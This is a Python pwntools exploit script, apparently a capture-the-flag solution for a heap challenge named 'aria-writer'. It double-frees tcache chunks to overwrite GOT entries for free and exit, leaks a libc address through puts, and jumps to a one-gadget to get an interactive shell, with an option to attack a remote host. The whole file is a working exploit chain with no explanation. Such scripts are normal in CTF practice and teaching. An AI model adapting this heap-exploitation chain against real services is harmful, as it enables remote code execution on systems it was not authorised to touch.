#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


def malloc(p, size, buf):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(str(size))
    p.recvuntil(b"what should i write tho >")
    p.sendline(buf)

def free(p):
    p.recvuntil(b">")
    p.sendline(b"2")

def show_name(p):
    p.recvuntil(b">")
    p.sendline(b"3")

if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./aria-writer"
    libc = ELF("./libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("example.com", 4444)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
            # after menu select
    		b *main+192
    		c
    	"""
    	p = gdb.debug(chall,cmd)
    elif len(argv) >= 2 and argv[1] == "gdb":
        p = gdb.debug(chall,'c')
    else:
        p = process(chall)

    # name
    name = "pwn newbie"
    p.recvuntil("whats your name")
    p.sendline(name)
    # global -> puts@got (0x30)
    malloc(p, 0x30, 'DUMMY')
    free(p)
    free(p)
    malloc(p, 0x30, p64(elf.symbols['global']))
    malloc(p, 0x30, 'DUMMY')
    # free@got -> puts@plt (0x20)
    malloc(p, 0x20, 'DUMMY')
    free(p)
    free(p)
    malloc(p, 0x20, p64(elf.got['free']))
    malloc(p, 0x20, 'DUMMY')
    # exit@got -> One-Gadget (0x40)
    malloc(p, 0x40, 'DUMMY')
    free(p)
    free(p)
    malloc(p, 0x40, p64(elf.got['exit']))
    malloc(p, 0x40, 'DUMMY')
    # leak
    malloc(p, 0x20, p64(elf.plt['puts']))
    malloc(p, 0x30, p64(elf.got['setvbuf']))
    free(p)
    p.recvuntil("ok that letter was bad anyways...\n")
    setbuf_got_addr = unpack(p.recv()[:6]+b"\00\00")
    log.info("setbuf@got: 0x{:06x}".format(setbuf_got_addr))
    libc_base = setbuf_got_addr - libc.symbols['setvbuf']
    log.info("libc base: 0x{:08x}".format(libc_base))
    # exec One-Gadget
    one_gadget_offset = 0x4f322
    one_gadget = libc_base + one_gadget_offset
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(str(0x40))
    p.recvuntil(b"what should i write tho >")
    p.sendline(p64(one_gadget))
    p.sendline(b"4")

    p.interactive()
